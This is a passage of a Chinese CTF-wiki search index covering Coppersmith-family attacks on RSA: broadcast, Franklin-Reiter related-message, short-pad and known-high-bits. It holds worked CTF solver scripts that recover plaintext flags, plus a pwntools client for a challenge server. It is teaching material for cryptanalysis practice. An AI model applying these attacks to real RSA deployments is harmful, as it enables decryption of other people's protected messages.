\u6b64\u5916\uff0c\u65e2\u7136  m n_i, 1\\leq i \\leq 3 m<n_i, 1\\leq i \\leq 3 \uff0c\u90a3\u4e48\u6211\u4eec\u77e5\u9053  m^3   n_1n_2n_3 m^3 < n_1n_2n_3  \u5e76\u4e14  C m^3   n_1n_2n_3 C<m^3 < n_1n_2n_3 \uff0c\u90a3\u4e48  m^3 = C m^3 = C \uff0c\u6211\u4eec\u5bf9 C \u5f00\u4e09\u6b21\u6839\u5373\u53ef\u5f97\u5230 m \u7684\u503c\u3002  \u5bf9\u4e8e\u8f83\u5927\u7684 e \u6765\u8bf4\uff0c\u6211\u4eec\u53ea\u662f\u9700\u8981\u66f4\u591a\u7684\u660e\u5bc6\u6587\u5bf9\u3002", 
            "title": "\u653b\u51fb\u539f\u7406"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_coppersmith_attack/#sctf-rsa3-level4", 
            "text": "\u53c2\u8003  http://ohroot.com/2016/07/11/rsa-in-ctf \u3002  \u8fd9\u91cc\u6211\u4eec\u4ee5 SCTF RSA3 \u4e2d\u7684 level4 \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u9996\u5148\u7f16\u5199\u4ee3\u7801\u63d0\u53d6 cap \u5305\u4e2d\u7684\u6570\u636e\uff0c\u5982\u4e0b  #!/usr/bin/env python \n\nfrom scapy.all import *\nimport zlib\nimport struct PA   =   24  packets   =  rdpcap ( ./syc_security_system_traffic3.pcap )  client   =   192.168.1.180  list_n   =   []  list_m   =   []  list_id   =   []  data   =   []  for  packet in packets:\n     # TCP Flag PA 24 means carry data \n     if  packet [ TCP ] .flags  ==  PA or packet [ TCP ] .flags  ==  PA +  1 :\n         src   =  packet [ IP ] .src\n         raw_data   =  packet [ TCP ] .load\n         head   =  raw_data.strip ()[ :7 ] \n         if   head   ==   We have :\n            n,  e   =  raw_data.strip () .replace ( We have got N is  ,\n                                             ) .split ( \\ne is  ) \n            data.append ( n.strip ()) \n         if   head   ==   encrypt :\n             m   =  raw_data.replace ( encrypted messages is 0x ,  ) .strip () \n            data.append ( str ( int ( m,  16 ))) \n\nwith open ( ./data.txt ,  w )  as f:\n     for  i in range ( 0 , len ( data ) ,  2 ) :\n         tmp   =   , .join ( s  for  s in data [ i:i +  2 ]) \n        f.write ( tmp +  \\n )   \u5176\u6b21\uff0c\u5229\u7528\u5f97\u5230\u7684\u6570\u636e\u76f4\u63a5\u4f7f\u7528\u4e2d\u56fd\u5269\u4f59\u5b9a\u7406\u6c42\u89e3\u3002  from   functools   import   reduce  import   gmpy  import   json ,   binascii  def   modinv ( a ,   m ): \n     return   int ( gmpy . invert ( gmpy . mpz ( a ),   gmpy . mpz ( m )))  def   chinese_remainder ( n ,   a ): \n     sum   =   0 \n     prod   =   reduce ( lambda   a ,   b :   a   *   b ,   n ) \n     # \u5e76\u884c\u8fd0\u7b97 \n     for   n_i ,   a_i   in   zip ( n ,   a ): \n         p   =   prod   //   n_i \n         sum   +=   a_i   *   modinv ( p ,   n_i )   *   p \n     return   int ( sum   %   prod )  nset   =   []  cset   =   []  with   open ( data.txt )   as   f : \n     now   =   f . read () . strip ( \\n ) . split ( \\n ) \n     for   item   in   now : \n         item   =   item . split ( , ) \n         nset . append ( int ( item [ 0 ])) \n         cset . append ( int ( item [ 1 ]))  m   =   chinese_remainder ( nset ,   cset )  m   =   int ( gmpy . mpz ( m ) . root ( 19 )[ 0 ])  print   binascii . unhexlify ( hex ( m )[ 2 : - 1 ])   \u5f97\u5230\u5bc6\u6587\uff0c\u7136\u540e\u518d\u6b21\u89e3\u5bc6\u5373\u53ef\u5f97\u5230 flag\u3002  H1sTaDs_B40aDcadt_attaCk_e_are_same_and_smA9l", 
            "title": "SCTF RSA3 LEVEL4"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_coppersmith_attack/#_4", 
            "text": "2017 WHCTF OldDriver  2018 N1CTF easy_fs", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_coppersmith_attack/#broadcast-attack-with-linear-padding", 
            "text": "\u5bf9\u4e8e\u5177\u6709\u7ebf\u6027\u586b\u5145\u7684\u60c5\u51b5\u4e0b\uff0c\u4ecd\u7136\u53ef\u4ee5\u653b\u51fb\uff0c\u8fd9\u65f6\u5019\u5c31\u4f1a\u4f7f\u7528  Coppersmith method  \u7684\u65b9\u6cd5\u4e86\uff0c\u8fd9\u91cc\u6682\u4e0d\u4ecb\u7ecd\u3002\u53ef\u4ee5\u53c2\u8003   https://en.wikipedia.org/wiki/Coppersmith%27s_attack#Generalizations", 
            "title": "Broadcast Attack with Linear Padding"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_coppersmith_attack/#related-message-attack", 
            "text": "", 
            "title": "Related Message Attack"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_coppersmith_attack/#_5", 
            "text": "\u5f53 Alice \u4f7f\u7528\u540c\u4e00\u516c\u94a5\u5bf9\u4e24\u4e2a\u5177\u6709\u67d0\u79cd\u7ebf\u6027\u5173\u7cfb\u7684\u6d88\u606f M1 \u4e0e M2 \u8fdb\u884c\u52a0\u5bc6\uff0c\u5e76\u5c06\u52a0\u5bc6\u540e\u7684\u6d88\u606f C1\uff0cC2 \u53d1\u9001\u7ed9\u4e86 Bob \u65f6\uff0c\u6211\u4eec\u5c31\u53ef\u80fd\u53ef\u4ee5\u83b7\u5f97\u5bf9\u5e94\u7684\u6d88\u606f M1 \u4e0e M2\u3002\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\u6a21\u6570\u4e3a N\uff0c\u4e24\u8005\u4e4b\u95f4\u7684\u7ebf\u6027\u5173\u7cfb\u5982\u4e0b   \nM_1 \\equiv f(M_2) \\bmod N  \nM_1 \\equiv f(M_2) \\bmod N   \u5176\u4e2d f \u4e3a\u4e00\u4e2a\u7ebf\u6027\u51fd\u6570\uff0c\u6bd4\u5982\u8bf4  f=ax+b f=ax+b \u3002  \u5728\u5177\u6709\u8f83\u5c0f\u9519\u8bef\u6982\u7387\u4e0b\u7684\u60c5\u51b5\u4e0b\uff0c\u5176\u590d\u6742\u5ea6\u4e3a  O(elog^2N) O(elog^2N) \u3002  \u8fd9\u4e00\u653b\u51fb\u7531 Franklin\uff0cReiter \u63d0\u51fa\u3002", 
            "title": "\u653b\u51fb\u6761\u4ef6"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_coppersmith_attack/#_6", 
            "text": "\u9996\u5148\uff0c\u6211\u4eec\u77e5\u9053  C_1 \\equiv M_1 ^e \\bmod N C_1 \\equiv M_1 ^e \\bmod N \uff0c\u5e76\u4e14  M_1 \\equiv f(M_2) \\bmod N M_1 \\equiv f(M_2) \\bmod N \uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u77e5\u9053  M_2 M_2  \u662f  f(x)^e \\equiv C_1 \\bmod N f(x)^e \\equiv C_1 \\bmod N  \u7684\u4e00\u4e2a\u89e3\uff0c\u5373\u5b83\u662f\u65b9\u7a0b  f(x)^e-C_1 f(x)^e-C_1  \u5728\u6a21 N \u610f\u4e49\u4e0b\u7684\u4e00\u4e2a\u6839\u3002\u540c\u6837\u7684\uff0c M_2 M_2  \u662f  x^e - C_2 x^e - C_2  \u5728\u6a21 N \u610f\u4e49\u4e0b\u7684\u4e00\u4e2a\u6839\u3002\u6240\u4ee5\u8bf4  x-M_2 x-M_2  \u540c\u65f6\u6574\u9664\u4ee5\u4e0a\u4e24\u4e2a\u591a\u9879\u5f0f\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u6c42\u5f97\u4e24\u4e2a\u591a\u9879\u5f0f\u7684\u6700\u5927\u516c\u56e0\u5b50\uff0c\u5982\u679c\u6700\u5927\u516c\u56e0\u5b50\u6070\u597d\u662f\u7ebf\u6027\u7684\u8bdd\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u6c42\u5f97\u4e86  M_2 M_2 \u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728  e=3 e=3  \u7684\u60c5\u51b5\u4e0b\uff0c\u6700\u5927\u516c\u56e0\u5b50\u4e00\u5b9a\u662f\u7ebf\u6027\u7684\u3002  \u8fd9\u91cc\u6211\u4eec\u5173\u6ce8\u4e00\u4e0b  e=3 e=3 \uff0c\u4e14  f(x)=ax+b f(x)=ax+b  \u7684\u60c5\u51b5\u3002\u9996\u5148\u6211\u4eec\u6709   \nC_1 \\equiv M_1 ^3 \\bmod N$ \u4e14$M_1 \\equiv aM_2+b \\bmod N  \nC_1 \\equiv M_1 ^3 \\bmod N$ \u4e14$M_1 \\equiv aM_2+b \\bmod N   \u90a3\u4e48\u6211\u4eec\u6709   \nC_1 \\equiv (aM_2+b)^3 \\bmod N$ \u4e14$C_2 \\equiv M_2^3 \\bmod N  \nC_1 \\equiv (aM_2+b)^3 \\bmod N$ \u4e14$C_2 \\equiv M_2^3 \\bmod N   \u6211\u4eec\u9700\u8981\u660e\u786e\u4e00\u4e0b\u6211\u4eec\u60f3\u8981\u5f97\u5230\u7684\u662f\u6d88\u606f m\uff0c\u6240\u4ee5\u9700\u8981\u5c06\u5176\u5355\u72ec\u6784\u9020\u51fa\u6765\u3002  \u9996\u5148\uff0c\u6211\u4eec\u6709\u5f0f 1   \n(aM_2+b)^3=a^3M_2^3+3a^2M^2b+3aM_2b^2+b^3  \n(aM_2+b)^3=a^3M_2^3+3a^2M^2b+3aM_2b^2+b^3   \u518d\u8005\u6211\u4eec\u6784\u9020\u5982\u4e0b\u5f0f 2   \n(aM_2)^3-b^3 \\equiv (aM_2-b)(a^2M_2^2+aM_2b+b^2) \\bmod N  \n(aM_2)^3-b^3 \\equiv (aM_2-b)(a^2M_2^2+aM_2b+b^2) \\bmod N   \u6839\u636e\u5f0f 1 \u6211\u4eec\u6709   \na^3M_2^3-2b^3+3b(a^2M_2^2+aM_2b+b^2) \\equiv C_1 \\bmod N  \na^3M_2^3-2b^3+3b(a^2M_2^2+aM_2b+b^2) \\equiv C_1 \\bmod N   \u7ee7\u800c\u6211\u4eec\u6709\u5f0f 3   \n3b(a^2M_2^2+aM_2b+b^2) \\equiv C_1-a^3C_2+2b^3 \\bmod N  \n3b(a^2M_2^2+aM_2b+b^2) \\equiv C_1-a^3C_2+2b^3 \\bmod N   \u90a3\u4e48\u6211\u4eec\u6839\u636e\u5f0f 2 \u4e0e\u5f0f 3 \u53ef\u5f97   \n(a^3C_2-b^3)*3b \\equiv (aM_2-b)( C_1-a^3C_2+2b^3 ) \\bmod N  \n(a^3C_2-b^3)*3b \\equiv (aM_2-b)( C_1-a^3C_2+2b^3 ) \\bmod N   \u8fdb\u800c\u6211\u4eec\u6709   \naM_2-b=\\frac{3a^3bC_2-3b^4}{C_1-a^3C_2+2b^3}  \naM_2-b=\\frac{3a^3bC_2-3b^4}{C_1-a^3C_2+2b^3}   \u8fdb\u800c   \naM_2\\equiv  \\frac{2a^3bC_2-b^4+C_1b}{C_1-a^3C_2+2b^3}  \naM_2\\equiv  \\frac{2a^3bC_2-b^4+C_1b}{C_1-a^3C_2+2b^3}   \u8fdb\u800c   \nM_2 \\equiv\\frac{2a^3bC_2-b^4+C_1b}{aC_1-a^4C_2+2ab^3}=\\frac{b}{a}\\frac{C_1+2a^3C_2-b^3}{C_1-a^3C_2+2b^3}  \nM_2 \\equiv\\frac{2a^3bC_2-b^4+C_1b}{aC_1-a^4C_2+2ab^3}=\\frac{b}{a}\\frac{C_1+2a^3C_2-b^3}{C_1-a^3C_2+2b^3}   \u4e0a\u9762\u7684\u5f0f\u5b50\u4e2d\u53f3\u8fb9\u6240\u6709\u7684\u5185\u5bb9\u90fd\u662f\u5df2\u77e5\u7684\u5185\u5bb9\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u83b7\u53d6\u5bf9\u5e94\u7684\u6d88\u606f\u3002  \u6709\u5174\u8da3\u7684\u53ef\u4ee5\u8fdb\u4e00\u6b65\u9605\u8bfb  A New Related Message Attack on RSA  \u4ee5\u53ca  paper  \u8fd9\u91cc\u6682\u4e0d\u505a\u8fc7\u591a\u7684\u8bb2\u89e3\u3002", 
            "title": "\u653b\u51fb\u539f\u7406"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_coppersmith_attack/#sctf-rsa3", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u4ee5 SCTF RSA3 \u4e2d\u7684 level3 \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u9996\u5148\uff0c\u8ddf\u8e2a TCP \u6d41\u53ef\u4ee5\u77e5\u9053\uff0c\u52a0\u5bc6\u65b9\u5f0f\u662f\u5c06\u660e\u6587\u52a0\u4e0a\u7528\u6237\u7684 user id \u8fdb\u884c\u52a0\u5bc6\uff0c\u800c\u4e14\u8fd8\u5b58\u5728\u591a\u7ec4\u3002\u8fd9\u91cc\u6211\u4eec\u9009\u62e9\u7b2c 0 \u7ec4\u548c\u7b2c 9 \u7ec4\uff0c\u4ed6\u4eec\u7684\u6a21\u6570\u4e00\u6837\uff0c\u89e3\u5bc6\u811a\u672c\u5982\u4e0b  import   gmpy2  id1   =   1002  id2   =   2614  c1   =   0x547995f4e2f4c007e6bb2a6913a3d685974a72b05bec02e8c03ba64278c9347d8aaaff672ad8460a8cf5bffa5d787c5bb724d1cee07e221e028d9b8bc24360208840fbdfd4794733adcac45c38ad0225fde19a6a4c38e4207368f5902c871efdf1bdf4760b1a98ec1417893c8fce8389b6434c0fee73b13c284e8c9fb5c77e420a2b5b1a1c10b2a7a3545e95c1d47835c2718 L  c2   =   0x547995f4e2f4c007e6bb2a6913a3d685974a72b05bec02e8c03ba64278c9347d8aaaff672ad8460a8cf5bffa5d787c72722fe4fe5a901e2531b3dbcb87e5aa19bbceecbf9f32eacefe81777d9bdca781b1ec8f8b68799b4aa4c6ad120506222c7f0c3e11b37dd0ce08381fabf9c14bc74929bf524645989ae2df77c8608d0512c1cc4150765ab8350843b57a2464f848d8e08 L  n   =   25357901189172733149625332391537064578265003249917817682864120663898336510922113258397441378239342349767317285221295832462413300376704507936359046120943334215078540903962128719706077067557948218308700143138420408053500628616299338204718213283481833513373696170774425619886049408103217179262264003765695390547355624867951379789924247597370496546249898924648274419164899831191925127182066301237673243423539604219274397539786859420866329885285232179983055763704201023213087119895321260046617760702320473069743688778438854899409292527695993045482549594428191729963645157765855337481923730481041849389812984896044723939553  a   =   1  b   =   id1   -   id2  def   getmessage ( a ,   b ,   c1 ,   c2 ,   n ): \n     b3   =   gmpy2 . powmod ( b ,   3 ,   n ) \n     part1   =   b   *   ( c1   +   2   *   c2   -   b3 )   %   n \n     part2   =   a   *   ( c1   -   c2   +   2   *   b3 )   %   n \n     part2   =   gmpy2 . invert ( part2 ,   n ) \n     return   part1   *   part2   %   n  message   =   getmessage ( a ,   b ,   c1 ,   c2 ,   n )   -   id2  message   =   hex ( message )[ 2 :]  if   len ( message )   %   2   !=   0 : \n     message   =   0   +   message  print   message . decode ( hex )   \u5f97\u5230\u660e\u6587  \u279c  sctf-rsa3-level3 git: ( master )  \u2717 python exp.py\nF4An8LIn_rElT3r_rELa53d_Me33Age_aTtaCk_e_I2_s7aLL  \u5f53\u7136\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 sage \u6765\u505a\uff0c\u4f1a\u66f4\u52a0\u7b80\u5355\u4e00\u70b9\u3002  import   binascii  def   attack ( c1 ,   c2 ,   b ,   e ,   n ): \n     PR . x = PolynomialRing ( Zmod ( n )) \n     g1   =   x ^ e   -   c1 \n     g2   =   ( x + b ) ^ e   -   c2 \n\n     def   gcd ( g1 ,   g2 ): \n         while   g2 : \n             g1 ,   g2   =   g2 ,   g1   %   g2 \n         return   g1 . monic () \n     return   - gcd ( g1 ,   g2 )[ 0 ]  c1   =   0x547995f4e2f4c007e6bb2a6913a3d685974a72b05bec02e8c03ba64278c9347d8aaaff672ad8460a8cf5bffa5d787c5bb724d1cee07e221e028d9b8bc24360208840fbdfd4794733adcac45c38ad0225fde19a6a4c38e4207368f5902c871efdf1bdf4760b1a98ec1417893c8fce8389b6434c0fee73b13c284e8c9fb5c77e420a2b5b1a1c10b2a7a3545e95c1d47835c2718 L  c2   =   0x547995f4e2f4c007e6bb2a6913a3d685974a72b05bec02e8c03ba64278c9347d8aaaff672ad8460a8cf5bffa5d787c72722fe4fe5a901e2531b3dbcb87e5aa19bbceecbf9f32eacefe81777d9bdca781b1ec8f8b68799b4aa4c6ad120506222c7f0c3e11b37dd0ce08381fabf9c14bc74929bf524645989ae2df77c8608d0512c1cc4150765ab8350843b57a2464f848d8e08 L  n   =   25357901189172733149625332391537064578265003249917817682864120663898336510922113258397441378239342349767317285221295832462413300376704507936359046120943334215078540903962128719706077067557948218308700143138420408053500628616299338204718213283481833513373696170774425619886049408103217179262264003765695390547355624867951379789924247597370496546249898924648274419164899831191925127182066301237673243423539604219274397539786859420866329885285232179983055763704201023213087119895321260046617760702320473069743688778438854899409292527695993045482549594428191729963645157765855337481923730481041849389812984896044723939553  e = 3  a   =   1  id1   =   1002  id2   =   2614  b   =   id2   -   id1  m1   =   attack ( c1 , c2 ,   b , e , n )  print   binascii . unhexlify ( %x   %   int ( m1   -   id1 ))   \u7ed3\u679c\u5982\u4e0b  \u279c  sctf-rsa3-level3 git: ( master )  \u2717 sage exp.sage\nsys:1: RuntimeWarning: not adding directory   to sys.path since everybody can write to it.\nUntrusted users could put files in this directory which might  then  be imported by your Python code. As a general precaution from similar exploits, you should not execute Python code from this directory\nF4An8LIn_rElT3r_rELa53d_Me33Age_aTtaCk_e_I2_s7aLL", 
            "title": "SCTF RSA3"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_coppersmith_attack/#_7", 
            "text": "hitcon 2014 rsaha  N1CTF 2018 rsa_padding", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_coppersmith_attack/#coppersmiths-short-pad-attack", 
            "text": "", 
            "title": "Coppersmith\u2019s short-pad attack"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_coppersmith_attack/#_8", 
            "text": "\u76ee\u524d\u5728\u5927\u90e8\u5206\u6d88\u606f\u52a0\u5bc6\u4e4b\u524d\u90fd\u4f1a\u8fdb\u884c padding\uff0c\u4f46\u662f\u5982\u679c padding \u7684\u957f\u5ea6\u8fc7\u77ed\uff0c\u4e5f\u6709 \u53ef\u80fd \u88ab\u5f88\u5bb9\u6613\u5730\u653b\u51fb\u3002", 
            "title": "\u653b\u51fb\u6761\u4ef6"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_coppersmith_attack/#_9", 
            "text": "\u6211\u4eec\u5047\u8bbe\u7231\u4e3d\u4e1d\u8981\u7ed9\u9c8d\u52c3\u53d1\u9001\u6d88\u606f\uff0c\u9996\u5148\u7231\u4e3d\u4e1d\u5bf9\u8981\u52a0\u5bc6\u7684\u6d88\u606f M \u8fdb\u884c\u968f\u673a padding\uff0c\u7136\u540e\u52a0\u5bc6\u5f97\u5230\u5bc6\u6587 C1\uff0c\u53d1\u9001\u7ed9\u9c8d\u52c3\u3002\u8fd9\u65f6\uff0c\u4e2d\u95f4\u4eba\u76ae\u7279\u622a\u83b7\u4e86\u5bc6\u6587\u3002\u4e00\u6bb5\u65f6\u95f4\u540e\uff0c\u7231\u4e3d\u4e1d\u6ca1\u6709\u6536\u5230\u9c8d\u52c3\u7684\u56de\u590d\uff0c\u518d\u6b21\u5bf9\u8981\u52a0\u5bc6\u7684\u6d88\u606f M \u8fdb\u884c\u968f\u673a padding\uff0c\u7136\u540e\u52a0\u5bc6\u5f97\u5230\u5bc6\u6587 C2\uff0c\u53d1\u9001\u7ed9 Bob\u3002\u76ae\u7279\u518d\u4e00\u6b21\u622a\u83b7\u3002\u8fd9\u65f6\uff0c\u76ae\u7279\u5c31 \u53ef\u80fd \u53ef\u4ee5\u5229\u7528\u5982\u4e0b\u539f\u7406\u89e3\u5bc6\u3002  \u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\u6a21\u6570 N \u7684\u957f\u5ea6\u4e3a k\uff0c\u5e76\u4e14 padding \u7684\u957f\u5ea6\u4e3a  m=\\lfloor \\frac{k}{e^2} \\rfloor m=\\lfloor \\frac{k}{e^2} \\rfloor \u3002\u6b64\u5916\uff0c\u5047\u8bbe\u8981\u52a0\u5bc6\u7684\u6d88\u606f\u7684\u957f\u5ea6\u6700\u591a\u4e3a k-m \u6bd4\u7279\uff0cpadding \u7684\u65b9\u5f0f\u5982\u4e0b   \nM_1=2^mM+r_1, 0\\leq r_1\\leq 2^m  \nM_1=2^mM+r_1, 0\\leq r_1\\leq 2^m   \u6d88\u606f M2 \u7684 padding \u65b9\u5f0f\u7c7b\u4f3c\u3002  \u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u5982\u4e0b\u7684\u65b9\u5f0f\u6765\u89e3\u5bc6\u3002  \u9996\u5148\u5b9a\u4e49   \ng_1(x,y)=x^e-C_1\ng_2(x,y)=(x+y)^e-C_2  \ng_1(x,y)=x^e-C_1\ng_2(x,y)=(x+y)^e-C_2   \u5176\u4e2d  y=r_2-r_1 y=r_2-r_1 \u3002\u663e\u7136\u8fd9\u4e24\u4e2a\u65b9\u7a0b\u5177\u6709\u76f8\u540c\u7684\u6839 M1\u3002\u7136\u540e\u8fd8\u6709\u4e00\u7cfb\u5217\u7684\u63a8\u5bfc\u3002", 
            "title": "\u653b\u51fb\u539f\u7406"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_coppersmith_attack/#known-high-bits-message-attack", 
            "text": "", 
            "title": "Known High Bits Message Attack"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_coppersmith_attack/#_10", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\u6211\u4eec\u9996\u5148\u52a0\u5bc6\u4e86\u6d88\u606f m\uff0c\u5982\u4e0b   \nC\\equiv m^d \\bmod N  \nC\\equiv m^d \\bmod N   \u5e76\u4e14\u6211\u4eec\u5047\u8bbe\u6211\u4eec\u77e5\u9053\u6d88\u606f m \u7684\u5f88\u5927\u7684\u4e00\u90e8\u5206  m_0 m_0 \uff0c\u5373  m=m_0+x m=m_0+x \uff0c\u4f46\u662f\u6211\u4eec\u4e0d\u77e5\u9053  x x \u3002\u90a3\u4e48\u6211\u4eec\u5c31\u6709\u53ef\u80fd\u901a\u8fc7\u8be5\u65b9\u6cd5\u8fdb\u884c\u6062\u590d\u6d88\u606f\u3002  \u53ef\u4ee5\u53c2\u8003  https://github.com/mimoo/RSA-and-LLL-attacks \u3002", 
            "title": "\u653b\u51fb\u6761\u4ef6"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_coppersmith_attack/#factoring-with-high-bits-known", 
            "text": "", 
            "title": "Factoring with High Bits Known"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_coppersmith_attack/#_11", 
            "text": "\u5f53\u6211\u4eec\u77e5\u9053\u4e00\u4e2a\u516c\u94a5\u4e2d\u6a21\u6570 N \u7684\u4e00\u4e2a\u56e0\u5b50\u7684\u8f83\u9ad8\u4f4d\u65f6\uff0c\u6211\u4eec\u5c31\u6709\u4e00\u5b9a\u51e0\u7387\u6765\u5206\u89e3 N\u3002", 
            "title": "\u653b\u51fb\u6761\u4ef6"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_coppersmith_attack/#_12", 
            "text": "\u8bf7\u53c2\u8003  https://github.com/mimoo/RSA-and-LLL-attacks \u3002\u4e0a\u9762\u6709\u4f7f\u7528\u6559\u7a0b\u3002\u5173\u6ce8\u4e0b\u9762\u7684\u4ee3\u7801  beta   =   0.5  dd   =   f . degree ()  epsilon   =   beta   /   7  mm   =   ceil ( beta ** 2   /   ( dd   *   epsilon ))  tt   =   floor ( dd   *   mm   *   (( 1 / beta )   -   1 ))  XX   =   ceil ( N ** (( beta ** 2 / dd )   -   epsilon ))   +   1000000000000000000000000000000000  roots   =   coppersmith_howgrave_univariate ( f ,   N ,   beta ,   mm ,   tt ,   XX )   \u5176\u4e2d\uff0c   \u5fc5\u987b\u6ee1\u8db3  q\\geq N^{beta} q\\geq N^{beta} \uff0c\u6240\u4ee5\u8fd9\u91cc\u7ed9\u51fa\u4e86 beta=0.5 beta=0.5 \uff0c\u663e\u7136\u4e24\u4e2a\u56e0\u6570\u4e2d\u5fc5\u7136\u6709\u4e00\u4e2a\u662f\u5927\u4e8e\u7684\u3002  XX \u662f $f(x)=q'+x $\u5728\u6a21 q \u610f\u4e49\u4e0b\u7684\u6839\u7684\u4e0a\u754c\uff0c\u81ea\u7136\u6211\u4eec\u53ef\u4ee5\u9009\u62e9\u8c03\u6574\u5b83\uff0c\u8fd9\u91cc\u5176\u5b9e\u4e5f\u8868\u660e\u4e86\u6211\u4eec\u5df2\u77e5\u7684  q' q'  \u4e0e\u56e0\u6570 q \u4e4b\u95f4\u53ef\u80fd\u7684\u5dee\u8ddd\u3002", 
            "title": "\u653b\u51fb\u5de5\u5177"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_coppersmith_attack/#_13", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u4ee5 2016 \u5e74 HCTF \u4e2d\u7684 RSA2 \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002  \u9996\u5148\u7a0b\u5e8f\u7684\u5f00\u5934\u662f\u4e00\u4e2a\u7ed5\u8fc7\u9a8c\u8bc1\u7684\uff0c\u7ed5\u8fc7\u5373\u53ef\uff0c\u4ee3\u7801\u5982\u4e0b  from   pwn   import   *  from   hashlib   import   sha512  sh   =   remote ( 127.0.0.1 ,   9999 )  context . log_level   =   debug  def   sha512_proof ( prefix ,   verify ): \n     i   =   0 \n     pading   =   \n     while   True : \n         try : \n             i   =   randint ( 0 ,   1000 ) \n             pading   +=   str ( i ) \n             if   len ( pading )     200 : \n                 pading   =   pading [ 200 :] \n             #print pading \n         except   StopIteration : \n             break \n         r   =   sha512 ( prefix   +   pading ) . hexdigest () \n         if   verify   in   r : \n             return   pading  def   verify (): \n     sh . recvuntil ( Prefix:  ) \n     prefix   =   sh . recvline () \n     print   len ( prefix ) \n     prefix   =   prefix [: - 1 ] \n     prefix   =   prefix . decode ( base64 ) \n     proof   =   sha512_proof ( prefix ,   fffffff ) \n     sh . send ( proof . encode ( base64 ))  if   __name__   ==   __main__ : \n     verify () \n     print   verify success \n     sh . recvuntil ( token:  ) \n     token   =   5c9597f3c8245907ea71a89d9d39d08e \n     sh . sendline ( token ) \n\n     sh . recvuntil ( n:  ) \n     n   =   sh . readline () . strip () \n     n   =   int ( n [ 2 :],   16 ) \n\n     sh . recvuntil ( e:  ) \n     e   =   sh . readline () . strip () \n     e   =   int ( e [ 2 :],   16 ) \n\n     sh . recvuntil ( e2:  ) \n     e2   =   sh . readline () . strip () \n     e2   =   int ( e2 [ 2 :],   16 ) \n\n     sh . recvuntil ( is:  ) \n     enc_flag   =   sh . readline () . strip () \n     enc_flag   =   int ( enc_flag [ 2 : - 1 ],   16 ) \n     print   n:  ,   hex ( n ) \n     print   e:  ,   hex ( e ) \n     print   e2:  ,   hex ( e2 ) \n     print   flag:  ,   hex ( enc_flag )   \u8fd9\u91cc\u6211\u4eec\u4e5f\u5df2\u7ecf\u5f97\u5230 n\uff0ce\uff0ce2\uff0c\u52a0\u5bc6\u540e\u7684 flag \u4e86\uff0c\u5982\u4e0b  n :    0x724d41149e1bd9d2aa9b333d467f2dfa399049a5d0b4ee770c9d4883123be11a52ff1bd382ad37d0ff8d58c8224529ca21c86e8a97799a31ddebd246aeeaf0788099b9c9c718713561329a8e529dfeae993036921f036caa4bdba94843e0a2e1254c626abe54dc3129e2f6e6e73bbbd05e7c6c6e9f44fcd0a496f38218ab9d52bf1f266004180b6f5b9bee7988c4fe5ab85b664280c3cfe6b80ae67ed8ba37825758b24feb689ff247ee699ebcc4232b4495782596cd3f29a8ca9e0c2d86ea69372944d027a0f485cea42b74dfd74ec06f93b997a111c7e18017523baf0f57ae28126c8824bd962052623eb565cee0ceee97a35fd8815d2c5c97ab9653c4553f  e :    0x10001  e2 :    0xf93b  flag :    0xf11e932fa420790ca3976468dc4df1e6b20519ebfdc427c09e06940e1ef0ca566d41714dc1545ddbdcae626eb51c7fa52608384a36a2a021960d71023b5d0f63e6b38b46ac945ddafea42f01d24cc33ce16825df7aa61395d13617ae619dca2df15b5963c77d6ededf2fe06fd36ae8c5ce0e3c21d72f2d7f20cd9a8696fbb628df29299a6b836c418cbfe91e2b5be74bdfdb4efdd1b33f57ebb72c5246d5dce635529f1f69634d565a631e950d4a34a02281cbed177b5a624932c2bc02f0c8fd9afd332ccf93af5048f02b8bd72213d6a52930b0faa0926973883136d8530b8acf732aede8bb71cb187691ebd93a0ea8aeec7f82d0b8b74bcf010c8a38a1fa8   \u63a5\u4e0b\u6765\u6211\u4eec\u6765\u5206\u6790\u4e3b\u7a0b\u5e8f\u3002\u53ef\u4ee5\u770b\u51fa       p ,   q ,   e   =   gen_key () \n     n   =   p   *   q \n     phi_n   =   ( p - 1 ) * ( q - 1 ) \n     d   =   invmod ( e ,   phi_n ) \n     while   True : \n         e2   =   random . randint ( 0x1000 ,   0x10000 ) \n         if   gcd ( e2 ,   phi_n )   ==   1 : \n             break   \u6211\u4eec\u5f97\u5230\u7684  n=p \\times q n=p \\times q \u3002\u800c p\uff0cq \u4ee5\u53ca\u6211\u4eec\u5df2\u77e5\u7684 e \u90fd\u5728  gen_key  \u51fd\u6570\u4e2d\u751f\u6210\u3002\u770b\u4e00\u770b  